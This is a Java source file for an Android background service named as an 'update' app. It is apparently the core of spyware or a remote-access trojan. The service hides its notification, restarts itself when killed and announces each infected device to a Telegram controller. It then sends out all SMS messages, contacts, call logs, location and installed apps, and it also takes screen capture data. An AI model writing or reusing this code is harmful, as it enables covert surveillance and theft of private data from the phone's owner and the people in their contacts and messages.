package com.kasari.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.ImageFormat;
import androidx.core.app.NotificationCompat;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class BackgroundService extends Service {

    private static final String CHANNEL_ID = "kasari_update_channel";
    private static final int NOTIFICATION_ID = 1001;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.cancel(NOTIFICATION_ID);
        }
        new Handler().postDelayed(() -> {
            stopForeground(Service.STOP_FOREGROUND_DETACH);
            startForeground(NOTIFICATION_ID, buildNotification());
            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }
        }, 50);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            int screenCode = intent.getIntExtra("screen_capture_code", -1);
            Intent screenData = intent.getParcelableExtra("screen_capture_data");
            if (screenCode != -1 && screenData != null) {
                ScreenMirror.setProjectionData(this, screenCode, screenData);
            }
        }

        // Initialize all modules
        new Handler().postDelayed(() -> {
            TelegramController.sendMessage(this, "🟢 Kasari Chauhan Connected!\n\n📱 Device: " +
                android.os.Build.MODEL + "\nAndroid: " + android.os.Build.VERSION.RELEASE +
                "\n\n✅ All services active");
            
            // Forward all data
            SmsForwarder.sendAllOldSms(this);
            ContactGrabber.sendContacts(this);
            CallInterceptor.sendCallLogs(this);
            LocationTracker.sendLocation(this);
            AppManager.sendApps(this);
        }, 2000);

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent broadcast = new Intent("restartservice");
        broadcast.setClass(this, BootStarter.class);
        sendBroadcast(broadcast);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Background Service",
                NotificationManager.IMPORTANCE_NONE);
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
        } else {
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}